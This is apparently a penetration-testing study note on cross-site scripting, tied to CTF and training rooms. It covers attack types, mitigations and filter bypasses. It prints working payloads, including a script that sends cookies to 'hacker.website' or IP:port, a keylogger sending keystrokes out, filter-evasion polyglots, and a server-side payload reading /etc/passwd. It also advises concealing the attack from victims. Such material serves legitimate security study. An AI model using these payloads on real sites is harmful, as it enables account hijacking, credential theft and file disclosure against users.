# Cross-site Scripting (XSS)

[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)
[![howwebsiteswork](../../../../_badges/thmp/howwebsiteswork.svg)](https://tryhackme.com/room/howwebsiteswork)
[![introductiontowebapplications](../../../../_badges/htb/introductiontowebapplications.svg)](https://academy.hackthebox.com/course/preview/introduction-to-web-applications)
[![cross_site_scripting](../../../../_badges/htb/cross_site_scripting.svg)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss)
[![xss_injection](../../../../_badges/poat/xss_injection.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
[![xss_filter_evasion](../../../../_badges/owasp/xss_filter_evasion.svg)](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
[![dom_based_xss_prevention](../../../../_badges/owasp/dom_based_xss_prevention.svg)](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
[![xss_stored_1](../../../../_badges/rootme/web_client/xss_stored_1.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)
[![xss_server_side](../../../../_badges/rootme/web_server/xss_server_side.svg)](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)

<div class="row row-cols-lg-2"><div>

Cross-site Scripting, most commonly called XSS, refers to injecting malicious JavaScript in a web application for it to be executed by other users. For instance, instead of a username, you could use:

```xml!
<script>alert('XSS')</script>
```

And, if the website isn't protected, then anyone consulting your profile will run the script `alert('XSS')` and will see an alert.

‚ö†Ô∏è When using XSS, you want to hide that you executed some XSS in someone's browser. So, you should ensure that no one sees anything suspicious. For instance, add a username before the XSS.
</div><div>

Common attack vectors

* üìö Headers <small>(mostly User-Agent)</small>
* üìÑ Forms
* üç™ Cookies
* üåç Vulnerable Web Browser

Common mitigations to XSS attacks are:

* üõë [Content-Security-Policy (CSP) header](/operating-systems/networking/protocols/http.md#http-headers-in-web-applications)
* üõ°Ô∏è Input sanitization <small>(`htmlentities` in PHP)</small>
* üîé Input filtering <small>(`strip_tags` in PHP)</small>
* üî• Web Application Firewall <small>(WAF)</small>

üí° XSS may be called HTML Injection when using an HTML payload.
</div></div>

<hr class="sep-both">

## XSS Attacks

[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)
[![cross_site_scripting](../../../../_badges/htb/cross_site_scripting.svg)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss)

<div class="row row-cols-lg-2"><div>

#### Reflected XSS

XSS is reflected when the injected payload is shown on the vulnerable webpage after being rendered by the web server.

üó∫Ô∏è The payload is usually inside the URL. For instance, given the URL: `https://example.com/vuln.php?q=payload` that render `payload` when loaded. We could exploit it using:

```xml!
https://example.com/vuln.php/?q=%3Cscript%3Ealert(%27XSS%27)%3B%3C%2Fscript%3E
```

üç∑ Users clicking on the link will execute our payload.

<br>

#### Stored XSS

[![xss_stored_1](../../../../_badges/rootme/web_client/xss_stored_1.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)
[![xss_server_side](../../../../_badges/rootme/web_server/xss_server_side.svg)](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)

The payload is injected and stored on the server, mostly in a database. At some point, it may be executed by a vulnerable web page.

üó∫Ô∏è Comments, profiles, listings... may be vulnerable.

üç∑ For instance, assuming we use the username `<script>alert('XSS');</script>`, if the profile page is vulnerable, this code will be executed when the server renders our username.
</div><div>

#### Blind XSS

XSS is said to be blind or out-band when we are sending a payload without prior knowledge of where it will be executed.

üó∫Ô∏è Feedback, contact, or support forms. We are targeting the administrators by testing if a contact chanel is vulnerable to any XSS.

üç∑ For instance, we include images in each parameter such as `<img src="IP:PORT/username">` for `username`. If we receive a request to `/xxx` on our grabber, then the payload worked for parameter `xxx`. Otherwise, we try another payload.

Refer to [HTTP Requests Grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md) to catch the response during CTFs.

<br>

#### DOM-based XSS

[![introductiontowebapplications](../../../../_badges/htb/introductiontowebapplications.svg)](https://academy.hackthebox.com/course/preview/introduction-to-web-applications)

DOM-based XSS occur without the server being aware of them. The client-side JavaScript is the one rendering the payload. For instance, when we use `xxx.innerHTML` or `document.write` <small>(referred to as "a sinker")</small>.

üó∫Ô∏è Mostly, javascript-based applications.

üç∑ If an application parsing anchors `URL#xxx` and displays a message, it may be exploited with payloads like `<img src="" onerror=print()>`. Most functions don't allow the `script` tag.
</div></div>


<hr class="sep-both">

## XSS payloads

<table class="table table-bordered border-dark table-dark bg-transparent mt-4">
<thead>
<tr><th>Case</th><th>HTML</th><th>Payload</th></tr>
</thead>
<tbody>

<tr><td>PoC</td><td><code>&lt;p&gt;here&lt;/p&gt;</code></td><td><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></td></tr>

<tr><td>PoC</td><td><code>&lt;p&gt;here&lt;/p&gt;</code></td><td><code>&lt;script&gt;console.log('XSS')&lt;/script&gt;</code></td></tr>

<tr><td>PoC</td><td><code>&lt;p&gt;here&lt;/p&gt;</code></td><td><code>&lt;script&gt;print()&lt;/script&gt;</code></td></tr>

<tr><td>PoC</td><td><code>&lt;p&gt;here&lt;/p&gt;</code></td><td><code>&lt;plaintext&gt;</code></td></tr>

<tr><td>Boxed attribute</td><td><code>&lt;input value="here"&gt;</code></td><td><code>">MaliciousCodeHere</code></td></tr>

<tr><td>Unboxed attribute</td><td><code>&lt;input value=here&gt;</code></td><td><code>>MaliciousCodeHere</code></td></tr>

<tr><td>Wrapped</td><td><code>&lt;textarea>here&lt;/textarea&gt;</code></td><td><code>&lt;/textarea&gt;MaliciousCodeHere</code></td></tr>

<tr><td>JavaScript</td><td><code>xxx.innerHTML = 'here';</code></td><td><code>';MaliciousCodeHere;//</code></td></tr>

<tr><td>Boxed Image</td><td><code>&lt;img src="here" alt="xxx"/&gt;</code></td><td><code>URL" onload="maliciousCodeHere"</code></td></tr>

<tr><td>Boxed Image</td><td><code>&lt;img src="here" alt="xxx"/&gt;</code></td><td><code>URL" onerror="maliciousCodeHere"</code></td></tr>
</tbody></table>

üìö Use `window.origin` when dealing with an iframe.

<hr class="sep-both">

## XSS 'malicious code'

<div class="row row-cols-lg-2"><div>

Common "malicious code" used in PoC payloads are 

* `alert(...)`: show an alert with a message
* `console.log(...)`: print a message in the console

Real examples of malicious code can be found at [XSS-payloads](http://www.xss-payloads.com/payloads-list.html?a#category=all).

#### Session hijacking

[![xss_stored_1](../../../../_badges/rootme/web_client/xss_stored_1.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)

Anyone executing this script will send their cookie to a malicious website owned by the hacker used to capture cookies. The script is using `btoa()` to encode in base64 the values. Sessions cookies are gold üí∞, because with them, we can bypass verifications such as 2FA and access someone else account of insecure webservers.

```html!
<script>fetch('https://hacker.website/hijack?cookie=' + btoa(document.cookie));</script>
<script>fetch('http://IP:port/?cookie=' + btoa(document.cookie));</script>
```

Refer to [HTTP Requests Grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md) to catch the response during CTFs.
</div><div>

#### Keylogger

Sends keys pressed to the hacker website. The script is using `btoa()` to encode in base64 the values.

```html
<script>
    let keys = ''
    document.onkeydown = e => keys += e.key
    setInterval(() => {
        if (keys === '') return
        fetch('https://hacker.website/keylogger?key=' + btoa(keys) )
        keys = ''
    }, 1000)
</script>
```
</div></div>

<hr class="sep-both">

## XSS filter by-pass

<div class="row row-cols-lg-2"><div>

There are usually a lot done to avoid XSS attacks, but there is also a lot of way to by-pass weak filters.

* **Logic flaw**: for instance, a dropdown with a list of countries. A user use XSS. The developer didn't filter the value as they expected a value within the list.

* **Bypass HTML symbols filtering**: If `<`, and `>` are filtered, an attacker may still use DOM Based XSS.

* **Bypass DOM Based Filtering**: if there is a filter removing every attribute such as `onload`, `onmouseover`... they could try variants as HTML is case-insensitive.

```xml!
<img src="" ONERROR="alert('XSS')" />
```

* **Polygots**: these are magic payloads designed to bypass many tags/attributes/filters/... at once.

```js!
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```

</div><div>

**Bypass keywords filtering**: most functions to filter something will only process the text once. It means that if the hacker knows that something is filtered, they may create a payload that is only working after being filtered. For instance, for a filter removing "&lt;script&gt;", below after filtering "&lt;s" and "cript&gt;" will be concatenated, effectively bypassing the filter.

```html!
<s<script>cript>alert('XSS');</s<script>cript>
// filter remove "<script>"
<script>alert('XSS');</script>
```

You can also try variants if the filter is case-sensitive

```html!
<scIpT>alert('XSS');</scIpT>
```

Another way of bypassing keyword filtering is using alternate code. For instance, with the function `alert`, we could do.

```html!
<img src="NOT_FOUND" onerror="eval('aler'+'t')('XSS')">
<!-- unicode in HTML with &# -->
<img src="NOT_FOUND" onerror=&#X61;&#X6C;&#X65;&#X72;&#X74;('XSS')>
<!-- unicode with \u -->
<img src="NOT_FOUND" onerror=\u0061lert('XSS')>
```
</div></div>

<hr class="sep-both">

## Server-Side XSS

[![server_side_xss_dynamic_pdf](../../../../_badges/hacktricks/pentesting_web/xss_cross_site_scripting/server_side_xss_dynamic_pdf.svg)](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)
[![xss_server_side](../../../../_badges/rootme/web_server/xss_server_side.svg)](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)

<div class="row row-cols-lg-2"><div>

If a website is creating a PDF using user-input, we may be able to write JavaScript code.

```html!
<script>document.write('poc')</script>
<img src="http://IP:port/img"/>
```

Refer to [HTTP Requests Grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md) to catch the response during CTFs.
</div><div>

We can use it to read files such as `/etc/passwd`:

```html!
<script>xhzeem=new XMLHttpRequest();xhzeem.onload=function(){document.write(this.responseText)};xhzeem.onerror=function(){document.write('failed!')};xhzeem.open("GET","file:///etc/passwd");xhzeem.send();</script>
```
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* Place to check: forms, headers
* `"><script src=//www.example.com/exploit.js></script>`: no http/https?
</div><div>
</div></div>